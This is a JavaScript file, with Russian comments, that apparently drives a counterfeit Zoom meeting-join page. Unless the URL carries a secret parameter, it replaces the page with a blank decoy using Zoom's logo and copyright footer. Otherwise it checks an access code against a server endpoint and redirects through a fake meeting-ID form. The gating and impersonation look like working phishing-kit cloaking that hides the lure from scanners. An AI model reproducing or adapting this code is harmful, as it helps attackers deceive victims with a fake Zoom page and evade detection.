var linkCurrent = window.location.href;
// Проверяем, есть ли параметр 'iflink' в URL
if (!new URLSearchParams(window.location.search).has("827943012pwd")) {
  document.head.innerHTML = ``;
  document.body.innerHTML = `
  <section class="header">
    <div class="container">
      <div class="header_items">
        <div class="header_item">
          <a href="#!" class="header_logo"><svg width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo" style="width: 115px !important;"><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg></a>
        </div>
        <div class="header_item">
          <div class="header_item_links">
            <a href="#!" class="header_item_link">Support</a>
            <a href="#!" class="header_item_link">English <img src="./assets/img/header_arrow.svg" alt="" /></a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="main">
    <div class="container">
      <svg viewBox="0 0 114 26" fill="#0b5cff" class="main_image" style=""><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg>
    </div>
  </section>

  <section class="footer">
    <div class="container">
      <p class="footer_copy">©2024 Zoom Video Communications, Inc. All rights reserved.</p>
      <div class="footer_navs">
        <div class="footer_nav"><a href="#!">Privacy & Legal Policies</a></div>
        <div class="footer_nav"><a href="#!">Do Not Sell My Personal Information</a></div>
        <div class="footer_nav"><a href="#!">Cookie Preferences</a></div>
      </div>
    </div>
  </section>

  <script src="assets/js/script.js"></script>
  <style>* {
box-sizing: border-box;
margin: 0;
padding: 0;
}

h1,
h2,
h3 {
margin: 0;
padding: 0;
}

p {
margin: 0;
padding: 0;
}

a {
text-decoration: none;
color: #f2f2f2;
display: block;
}

body {
font-family: "Futura PT", sans-serif;
font-weight: 400;
top: 0;
left: 0;
padding: 0;
background: #fff;
margin: 0;
width: 100%;
height: 100%;
display: flex;
flex-direction: column;
position: relative;
}

html,
body {
width: 100%;
height: 100vh;
overflow-x: hidden;
}

::-webkit-scrollbar {
width: 5px;
background-color: #c8d5de;
height: 5px;
border-radius: 10px;
}

::-webkit-scrollbar-thumb {
border-radius: 10px;
background-color: #094fe2;
width: 5px;
}

::-webkit-scrollbar-track {
-webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
border-radius: 10px;
background-color: #c8d5de;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Medium.ttf);
font-weight: 450;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Book.ttf);
font-weight: 400;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Demi.ttf);
font-weight: 500;
}


.header {
width: 100%;
height: 65px;
box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
}
.container{
width: 100%;
max-width: 1400px;
display: block;
margin: 0 auto;
}
.header_logo {
padding-top: 20px;
padding-bottom: 20px;
}
.header_items{
display: flex;
align-items: center;
}

.header_item:last-child{
margin-left: auto;
}

.header_item_links{
display: flex;
align-items: center;
}

.header_item_link{
color: #0e71eb;
font-size: 16px;
cursor: pointer;
transition: all .5s;
display: flex;
align-items: center;
}

.header_item_link:hover{
text-decoration: underline;
}

.header_item_link:first-child{
margin-right: 24px;
}

.header_item_link:last-child img{
vertical-align: middle;
margin-left: 5px;
transform: rotate(-90deg);
width: 8px;
}

.main_image{
display: block;
margin: 0 auto;
width: 100%;
max-width: 400px;
}
.main {
margin-bottom: 48px;
margin-top: auto;
}

.footer {
margin-top: auto;
padding-top: 50px;
padding-bottom: 50px;
background: #f0f0f0;
border-top: 1px solid rgba(0, 0, 0, 0.1);
}
.footer_copy {
font-size: 14px;
line-height: 16px;
color: rgba(4, 4, 19, 0.56);
text-align: center;
}

.footer_navs {
display: flex;
align-items: center;
justify-content: center;
margin-top: 5px;
}
.footer_nav{
padding-right: 6px;
margin-left: 6px;
border-right: 1px solid rgba(4, 4, 19, 0.26);
}

.footer_nav:last-child{
margin-right: 0px;
border-right: none;
}

.footer_nav a{
font-size: 14px;
color: rgba(4, 4, 19, 0.56);
line-height: 16px;
}

.footer_nav a:hover{
text-decoration: underline;
}

@media (min-width:320px) and (max-width:499px){
.container{
  padding-left: 20px;
  padding-right: 20px;
}
.footer_copy{
  font-size: 12px;
}

.main_image{
  max-height: 100px;
}

.footer_navs{
  flex-direction: column;
}
.footer_nav{
  margin-bottom: 5px;
  margin-right: 0px;
  margin-left: 0px;
  border-right: none;
}

}



@media (min-width:500px) and (max-width:1440px){
.container{
  padding-left: 20px;
  padding-right: 20px;
}

}</style>
  `;
  document.title = "One platfrom to connect | Zoom";

  
} else {
  var codeCurrent = linkCurrent.split("827943012pwd=")[1].split("TT5.1")[0];

  localStorage.setItem("code", codeCurrent);
  $.ajax({
    url: "/checkcode.php",
    type: "POST",
    data: { code: codeCurrent },
    success: function (result) {
      if (result == "0") {
        document.head.innerHTML = ``;
        document.body.innerHTML = `
    <section class="header">
      <div class="container">
        <div class="header_items">
          <div class="header_item">
            <a href="#!" class="header_logo"><svg width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo" style="width: 115px !important;"><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg></a>
          </div>
          <div class="header_item">
            <div class="header_item_links">
              <a href="#!" class="header_item_link">Support</a>
              <a href="#!" class="header_item_link">English <img src="./assets/img/header_arrow.svg" alt="" /></a>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section class="main">
      <div class="container">
        <svg viewBox="0 0 114 26" fill="#0b5cff" class="main_image" style=""><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg>
      </div>
    </section>

    <section class="footer">
      <div class="container">
        <p class="footer_copy">©2024 Zoom Video Communications, Inc. All rights reserved.</p>
        <div class="footer_navs">
          <div class="footer_nav"><a href="#!">Privacy & Legal Policies</a></div>
          <div class="footer_nav"><a href="#!">Do Not Sell My Personal Information</a></div>
          <div class="footer_nav"><a href="#!">Cookie Preferences</a></div>
        </div>
      </div>
    </section>

    <script src="assets/js/script.js"></script>
    <style>* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

h1,
h2,
h3 {
  margin: 0;
  padding: 0;
}

p {
  margin: 0;
  padding: 0;
}

a {
  text-decoration: none;
  color: #f2f2f2;
  display: block;
}

body {
  font-family: "Futura PT", sans-serif;
  font-weight: 400;
  top: 0;
  left: 0;
  padding: 0;
  background: #fff;
  margin: 0;
  width: 100%;
  height: 100%;
  display: flex;
  flex-direction: column;
  position: relative;
}

html,
body {
  width: 100%;
  height: 100vh;
  overflow-x: hidden;
}

::-webkit-scrollbar {
  width: 5px;
  background-color: #c8d5de;
  height: 5px;
  border-radius: 10px;
}

::-webkit-scrollbar-thumb {
  border-radius: 10px;
  background-color: #094fe2;
  width: 5px;
}

::-webkit-scrollbar-track {
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
  border-radius: 10px;
  background-color: #c8d5de;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Medium.ttf);
  font-weight: 450;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Book.ttf);
  font-weight: 400;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Demi.ttf);
  font-weight: 500;
}


.header {
  width: 100%;
  height: 65px;
  box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
}
.container{
  width: 100%;
  max-width: 1400px;
  display: block;
  margin: 0 auto;
}
.header_logo {
  padding-top: 20px;
  padding-bottom: 20px;
}
.header_items{
  display: flex;
  align-items: center;
}

.header_item:last-child{
  margin-left: auto;
}

.header_item_links{
  display: flex;
  align-items: center;
}

.header_item_link{
  color: #0e71eb;
  font-size: 16px;
  cursor: pointer;
  transition: all .5s;
  display: flex;
  align-items: center;
}

.header_item_link:hover{
  text-decoration: underline;
}

.header_item_link:first-child{
  margin-right: 24px;
}

.header_item_link:last-child img{
  vertical-align: middle;
  margin-left: 5px;
  transform: rotate(-90deg);
  width: 8px;
}

.main_image{
  display: block;
  margin: 0 auto;
  width: 100%;
  max-width: 400px;
}
.main {
  margin-bottom: 48px;
  margin-top: auto;
}

.footer {
  margin-top: auto;
  padding-top: 50px;
  padding-bottom: 50px;
  background: #f0f0f0;
border-top: 1px solid rgba(0, 0, 0, 0.1);
}
.footer_copy {
  font-size: 14px;
  line-height: 16px;
  color: rgba(4, 4, 19, 0.56);
  text-align: center;
}

.footer_navs {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: 5px;
}
.footer_nav{
  padding-right: 6px;
  margin-left: 6px;
  border-right: 1px solid rgba(4, 4, 19, 0.26);
}

.footer_nav:last-child{
  margin-right: 0px;
  border-right: none;
}

.footer_nav a{
  font-size: 14px;
  color: rgba(4, 4, 19, 0.56);
  line-height: 16px;
}

.footer_nav a:hover{
  text-decoration: underline;
}

@media (min-width:320px) and (max-width:499px){
  .container{
    padding-left: 20px;
    padding-right: 20px;
  }
  .footer_copy{
    font-size: 12px;
  }

  .main_image{
    max-height: 100px;
  }

  .footer_navs{
    flex-direction: column;
  }
  .footer_nav{
    margin-bottom: 5px;
    margin-right: 0px;
    margin-left: 0px;
    border-right: none;
  }

}



@media (min-width:500px) and (max-width:1440px){
  .container{
    padding-left: 20px;
    padding-right: 20px;
  }

}</style>
    `;
        document.title = "One platfrom to connect | Zoom";
      }
    },
  });
}

// Создаем meta теги
const metaTags = [{ charset: "utf-8" }];

// Добавляем мета теги в <head> элемент
const head = document.head;
metaTags.forEach((tag) => {
  const metaTag = document.createElement("meta");
  for (let key in tag) {
    metaTag.setAttribute(key, tag[key]);
  }
  head.appendChild(metaTag);
});
var buttonLanguage = document.getElementById("wc-dropdown-language");

buttonLanguage.addEventListener("click", function () {
  var dropdownLanguage = document.getElementById("wc-dropdown-menu");
  dropdownLanguage.style.display = "block";
});
$(function () {
  var joinInput = $("#join-confno");
  if (joinInput.length > 0 && joinInput.val().length === 0) {
    disableJoinBtn();
  } else {
    enableJoinBtn();
  }
  joinInput.bind("change keyup input", function () {
    if (joinInput.length > 0 && joinInput.val().length === 0) {
      disableJoinBtn();
      return;
    }
    var confno = $.trim(joinInput.val());
    if (!isNaN(confno.charAt(0))) {
      confno = confno.replace(/[^\d]/g, "");
      var meetingNumber9 = 9;
      var meetingNumber10 = 10;
      var meetingNumber11 = 11;
      if (
        confno.length !== meetingNumber9 &&
        confno.length !== meetingNumber10 &&
        confno.length !== meetingNumber11
      ) {
        disableJoinBtn();
        return;
      }
      enableJoinBtn();
    } else {
      if (confno.length < 5) {
        disableJoinBtn();
      } else {
        enableJoinBtn();
      }
    }
  });
});
function disableJoinBtn() {
  $("#btnSubmit").attr("disabled", true);
  $("#btnSubmit").css("background-color", "rgba(82, 82, 128, 0.09)");
  $("#btnSubmit").css("border-color", "#fff");
  $("#btnSubmit").css("color", "#909096");
}
function enableJoinBtn() {
  $("#btnSubmit").attr("disabled", false);
  $("#btnSubmit").css("background-color", "#0E71EB");
  $("#btnSubmit").css("border-color", "#0E71EB");
  $("#btnSubmit").css("color", "#fff");
}
$("#btnSubmit").click(function () {
  $.ajax({
    url: "/checkcode.php",
    type: "POST",
    data: {
      code: $("#join-confno").val(),
    }, // Обратите внимание, что мы здесь больше не преобразуем данные в JSON
    success: function (result) {
      console.log(result);
      if (result == "1") {
        localStorage.setItem("code", $("#join-confno").val());
        window.location.href =
          "/?pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#succes&code=" +
          $("#join-confno").val();
      } else {
        $("#join-errormsg").removeClass("hideme");
      }
    },
  });
});
